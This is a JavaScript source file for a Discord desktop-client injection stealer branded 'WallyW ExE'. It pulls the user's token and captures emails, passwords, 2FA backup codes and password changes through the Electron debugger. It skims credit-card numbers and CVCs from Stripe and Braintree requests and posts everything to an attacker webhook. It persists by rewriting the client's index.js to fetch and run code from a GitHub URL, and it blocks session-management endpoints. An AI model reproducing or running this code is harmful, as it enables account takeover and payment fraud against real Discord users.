const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK_URL%",
    injection_url: "https://raw.githubusercontent.com/69WallyW69/dwad2r1f21faawa/refs/heads/main/index.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Employee: {
            Value: 1,
            Emoji: "<:WallyW_Discordstaff:1270725405917057128>",
            Rare: true,
            Price: 90000
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:WallyW_Partner:1270725650226876459>",
            Rare: true,
            Price: 600
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:WallyW_HypeEvents:1270725883467923526>",
            Rare: true,
            Price: 1000
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:WallyW_BugHunterNormal:1270726107259338927>",
            Rare: true,
            Price: 2500
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:WallyW_EarlySupporter:1270726282740633661>",
            Rare: true,
            Price: 60
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:WallyW_BugHunterMax:1270726634915237888>",
            Rare: true,
            Price: 5000
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:WallyW_BotDev:1270726831770832937>",
            Rare: true,
            Price: 500
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:WallyW_Bravery:1270727244138025000>",
            Rare: false,
            Price: 0
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:WallyW_Brilliance:1270727620803297374>",
            Rare: false,
            Price: 0
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:WallyW_Balance:1270727840228311130>",
            Rare: false,
            Price: 0
        },
        Discord_Official_Moderator: {
            Value: 262144,
            Emoji: "<:WallyW_Moderator:1270728086396338198>",
            Rare: true,
            Price: 900
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "<:WallyW_Active_Developer:1270728269603536957>",
            Rare: true,
            Price: 0
        }
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const hooker = async (content, token, account) => {
    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
    content["username"] = "WallyW ExE - Discord Injection";
    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1233084065280692264/1273676077469798451/wallywlogo.png?ex=66c02388&is=66bed208&hm=83f8acc49e30aed2e31893b6ef18096dbd4c7bdb24247c43e9df0ebdbb2ed768&";
    content["embeds"][0]["thumbnail"] = {
        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
    };
    content["embeds"][0]["footer"] = {
        "text": "WallyW ExE Discord Injection | @t.me/wm4rket",
        "icon_url": "https://cdn.discordapp.com/attachments/1233084065280692264/1273676077469798451/wallywlogo.png?ex=66c02388&is=66bed208&hm=83f8acc49e30aed2e31893b6ef18096dbd4c7bdb24247c43e9df0ebdbb2ed768&",
    };
    content["embeds"][0]["title"] = "Account Information";

    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBilling(token);

    const friends = await getFriends(token);
    const servers = await getServers(token);

    content["embeds"][0]["fields"].push({
        "name": "<:WallyW_Token:1270729277037346828>Token",
        "value": "```" + token + "```",
        "inline": false
    }, {
        "name": "<:WallyW_Nitrotype:1270729274168705177>Nitro",
        "value": nitro,
        "inline": true
    }, {
        "name": "<:WallyW_Event:1270736055812751499>Badges",
        "value": badges,
        "inline": true
    }, {
        "name": "<:WallyW_Preview:1270736421199548466>Billing",
        "value": billing,
        "inline": true
    });

    content["embeds"].push({
        "title": `<:WallyW_List:1270729268988739635> Total Friends: ${friends.totalFriends}`,
        "description": friends.message,
    }, {
        "title": `<:WallyW_List:1270729268988739635> Total Servers: ${servers.totalGuilds}`,
        "description": servers.message,
    });

    for (const embed in content["embeds"]) {
        content["embeds"][embed][""] = 0x2b2d31;
    }

    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(content));
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => await fetch("/billing/payment-sources", {
    "Authorization": token
});
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const getNitro = flags => {
    switch (flags) {
        case 1:
            return '<:WallyW_NitroBadge:1270730341526798387>';
        case 2:
            return '<:Nitro:1217503832389718200>';
        case 3:
            return '<:WallyW_NitroBadge:1270730341526798387>';
        default:
            return '`❌`';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
}

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
}

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '<:WallyW_BlackCard:1270728933175857243>';
                    break;
                case 2:
                    billing += '<:WallyW_Paypal:1270728573459890247>';
                    break;
            }
        }
    });
    return billing || '`❌`';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);

    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);

    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**Rare Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:WallyW_Owner:1273981094038995026> Owner" : "<:WallyW_Admin:1273981521342238793> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }

    rareGuilds = rareGuilds || "**No Rare Servers**";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [{
                "name": "<:WallyW_Mail:1270729270938964029>Email",
                "value": "`" + email + "`",
                "inline": true
            }, {
                "name": "<:WallyW_Token:1270729277037346828>Password",
                "value": "`" + password + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token)

    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });

    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** Just Checked Hes 2FA Codes!`,
        "embeds": [{
            "fields": [{
                    "name": "<:WallyW_List:1270729268988739635>Backup Codes",
                    "value": "```" + message + "```",
                    "inline": false
                },
                {
                    "name": "<:WallyW_Mail:1270729270938964029>Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "<:WallyW_Ip:1270729267067490438>Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }
            ]

        }]
    };

    hooker(content, token, account);
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** Just Changed Hes Password!`,
        "embeds": [{
            "fields": [{
                "name": "<:WallyW_Token:1270729277037346828>New Password",
                "value": "`" + newPassword + "`",
                "inline": true
            }, {
                "name": "<:WallyW_Token:1270729277037346828>Old Password",
                "value": "`" + oldPassword + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** Just Added Credit Card!`,
        "embeds": [{
            "fields": [{
                "name": "<:WallyW_Ip:1270729267067490438>Number",
                "value": "`" + number + "`",
                "inline": true
            }, {
                "name": "<:WallyW_BlackCard:1270728933175857243>CVC",
                "value": "`" + cvc + "`",
                "inline": true
            }, {
                "name": "<:WallyW_Preview:1270736421199548466>Expiration",
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** Just Added Paypal Account!`,
        "embeds": [{
            "fields": [{
                "name": "<:WallyW_Mail:1270729270938964029>Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "<:WallyW_Mail:1270729270938964029>Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));

        const token = await getToken();
        if (!token) return;

        const account = await fetchAccount(token)

        const content = {
            "content": `**${account.username}** Just Got Infected!`,

            "embeds": [{
                "fields": [{
                    "name": "<:WallyW_Ip:1270729267067490438>Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "<:WallyW_Mail:1270729270938964029> Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }]
            }]
        };

        await hooker(content, token, account);
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                    name: 'discord',
                    main: 'index.js',
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return; // 2FA
                }
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;

                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                }

                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow()
    });
}
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");
